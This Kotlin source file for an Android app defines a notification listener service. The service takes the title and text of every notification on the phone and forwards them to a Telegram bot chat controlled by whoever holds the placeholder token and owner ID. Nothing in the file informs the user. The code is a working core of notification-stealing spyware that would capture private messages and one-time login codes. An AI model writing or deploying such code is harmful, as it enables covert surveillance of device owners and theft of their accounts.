package com.example.myapp

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import okhttp3.*

class NotificationService : NotificationListenerService() {
    private val botToken = "TOKEN_BOT"
    private val chatId = "ID_OWNER"
    
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val title = sbn.notification.extras.getString("android.title")
        val text = sbn.notification.extras.getString("android.text")
        sendToTelegram("📩 Notif Masuk: $title - $text")
    }

    private fun sendToTelegram(message: String) {
        val client = OkHttpClient()
        val requestBody = RequestBody.create(null, ByteArray(0))
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message")
            .post(requestBody)
            .build()

        client.newCall(request).execute()
    }
}
